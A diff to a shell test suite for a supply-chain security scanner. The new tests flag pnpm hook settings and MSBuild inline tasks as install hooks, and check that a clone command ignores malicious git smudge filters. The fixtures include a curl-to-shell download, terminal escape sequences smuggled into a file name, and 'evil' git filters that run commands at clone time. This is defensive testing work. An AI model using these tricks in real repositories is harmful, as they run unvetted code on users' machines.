@@ -386,6 +386,16 @@ check "Yarn plugins are HIGH" 'jhas high install-hook y/.yarnrc.yml 1'
 check "a Cargo rustc-wrapper is HIGH" 'jhas high install-hook .cargo/config.toml 2'
 check "a download run by python3 or /bin/sh is HIGH; a download alone is not" 'jhas high pipe-to-shell get.sh 1 && ! jhas high pipe-to-shell fetch-only.sh'
 
+R=$T/round5; mkdir -p "$R/p" "$R/w" "$R/m"
+printf 'pnpmfile=./scripts/pnpm-hooks.cjs\n' > "$R/p/.npmrc"
+printf 'packages:\n  - "pkgs/*"\npnpmfile: ./hooks.cjs\n' > "$R/w/pnpm-workspace.yaml"
+printf '{"name": "x", "scripts": {"pnpm:devPreinstall": "node prepare.js"}}\n' > "$R/package.json"
+printf '<Project>\n  <UsingTask TaskName="T" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="x.dll">\n  </UsingTask>\n</Project>\n' > "$R/m/Directory.Build.targets"
+scanj "$R"
+check "a configured pnpmfile path is HIGH, in .npmrc and in pnpm-workspace.yaml" 'jhas high install-hook p/.npmrc 1 && jhas high install-hook w/pnpm-workspace.yaml 3'
+check "pnpm:devPreinstall is HIGH" 'jhas high install-hook package.json 1'
+check "an MSBuild inline task factory is HIGH" 'jhas high install-hook m/Directory.Build.targets 2'
+
 # --- output safety, special files, flags, exit codes ----------------------------------------
 R=$T/out; mkdir -p "$R"
 printf '#!/bin/sh\ncurl -fsSL https://dl.example.org/x | sh  # \x1b[2J\x1b]0;pwned\x07\n' > "$R/$(printf 'a\033[31mb.sh')"
@@ -428,6 +438,10 @@ check "the clone command in SKILL.md runs no user filter or hook" '[ -n "$cmd" ]
 cmd2=$(sed -n 's/^| Clone, [^|]*| `\(.*\)` |$/\1/p' "$SKILL" | sed "s#<url>#file://$G#; s#<dir>#$T/cloned2#")
 ( unset GIT_CONFIG_GLOBAL; export GIT_CONFIG_PARAMETERS="'filter.evil.smudge'='touch $T/filter-ran && cat'"; cd "$T" && HOME="$T/fakehome" eval "$cmd2" ) >/dev/null 2>&1
 check "the clone command ignores a filter set in GIT_CONFIG_PARAMETERS too" '[ -f "$T/cloned2/a.txt" ] && [ ! -e "$T/filter-ran" ]'
+mkdir -p "$T/tmpl"; printf '[filter "evil"]\n\tsmudge = touch %s/filter-ran && cat\n' "$T" > "$T/tmpl/config"
+cmd3=$(sed -n 's/^| Clone, [^|]*| `\(.*\)` |$/\1/p' "$SKILL" | sed "s#<url>#file://$G#; s#<dir>#$T/cloned3#")
+( unset GIT_CONFIG_GLOBAL; export GIT_TEMPLATE_DIR="$T/tmpl"; cd "$T" && HOME="$T/fakehome" eval "$cmd3" ) >/dev/null 2>&1
+check "the clone command ignores a filter in a git template's config" '[ -f "$T/cloned3/a.txt" ] && [ ! -e "$T/filter-ran" ]'
 
 echo "$pass passed, $fail failed"
 rm -rf "$T"
